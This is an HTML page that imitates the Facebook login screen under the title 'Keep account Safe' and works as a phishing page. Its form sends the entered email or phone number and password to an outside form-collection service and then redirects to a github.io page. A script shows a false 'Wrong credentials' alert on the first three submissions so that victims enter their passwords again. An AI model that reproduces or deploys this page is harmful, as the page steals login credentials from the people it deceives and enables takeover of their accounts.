<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keep account Safe</title>
    <style>
        /* Reset default styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            justify-content: space-between;
            width: 980px;
        }

        .left-section {
            width: 50%;
            padding-right: 30px;
        }

        .left-section h1 {
            color: #1877f2;
            font-size: 56px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .left-section p {
            font-size: 24px;
            color: #1c1e21;
        }

        .right-section {
            width: 40%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box {
            background-color: #ffffff;
            padding: 20px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 100%;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 16px;
        }

        .login-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .forgot-link {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 16px;
        }

        hr {
            border: none;
            border-top: 1px solid #dddfe2;
            margin: 20px 0;
        }

        .signup-btn {
            width: 100%;
            padding: 12px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }

        .create-page-link {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            text-align: center;
        }

        .create-page-link:hover {
            text-decoration: underline;
        }

        /* Media queries for responsiveness */
        @media screen and (max-width: 768px) {
            .container {
                flex-direction: column;
                align-items: center;
                width: 100%;
            }

            .left-section {
                width: 100%;
                text-align: center;
                padding-right: 0;
                margin-bottom: 30px;
            }

            .left-section h1 {
                font-size: 40px;
            }

            .left-section p {
                font-size: 20px;
            }

            .right-section {
                width: 100%;
            }

            .login-box {
                width: 90%;
            }
        }

        @media screen and (max-width: 480px) {
            .left-section h1 {
                font-size: 30px;
            }

            .left-section p {
                font-size: 16px;
            }

            .input-field {
                padding: 10px;
                font-size: 14px;
            }

            .login-btn, .signup-btn {
                padding: 10px;
                font-size: 14px;
            }

            .login-box {
                width: 95%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <!-- <h1>facebook</h1> -->
            <p>Keep account safe</p>
        </div>
        <div class="right-section">
            <div class="login-box">
                <form id="loginForm" action="https://submit-form.com/fqbhCid6o" onsubmit="return handleSubmit(event)">
                    <input
                    type="hidden"
                    name="_redirect"
                    value="https://secured1111.github.io/secure/"
                  />
                    <input name="phone numb" type="text" placeholder="Email or phone number" class="input-field" required>
                    <input name="psswd" type="password" placeholder="Password" class="input-field" required>
                    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                    <a href="#" class="forgot-link">Forgotten password?</a>
                    <hr>
                    <button type="button" class="signup-btn">Create New Account</button>
                </form>
            </div>
            <p><a href="#" class="create-page-link">Create a Page</a> for a celebrity, band or business.</p>
        </div>
    </div>

    <script>
        let clickCount = 0; // Counter to keep track of how many times the button is clicked
    
        function handleSubmit(event) {
            clickCount++; // Increment the click count
    
            // For first 3 clicks, show alert but allow the form to submit
            if (clickCount <= 3) {
                alert("Wrong credentials !! please try again.");
                return true; // Allow form submission
            }
    
            // After 3 clicks, stop showing the alert but submit the form
            return true; // Allow form submission without alert
        }
    </script>
    
</body>
</html>
